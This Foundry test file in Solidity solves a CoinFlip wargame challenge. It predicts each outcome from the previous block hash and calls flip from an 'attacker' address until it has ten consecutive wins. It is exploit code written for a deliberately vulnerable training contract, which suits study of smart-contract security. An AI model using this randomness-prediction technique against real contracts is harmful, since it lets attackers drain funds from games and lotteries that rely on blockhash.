// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployCoinFlipScript} from "@script/3_DeployCoinFlip.s.sol";
import {CoinFlip} from "@main/3_CoinFlip.sol";

contract CoinFlipTest is Test, DeployCoinFlipScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 10 ether);

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        DeployCoinFlipScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq( coinflipChallenge.consecutiveWins(), 0);
        while (coinflipChallenge.consecutiveWins()< 10) {

            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side) {
                coinflipChallenge.flip(true); 
            } else {
                coinflipChallenge.flip(false);
            }

            vm.roll(block.number + 1);
        }

        assertEq( coinflipChallenge.consecutiveWins(), 10);
        
        vm.stopPrank( );
    }

}


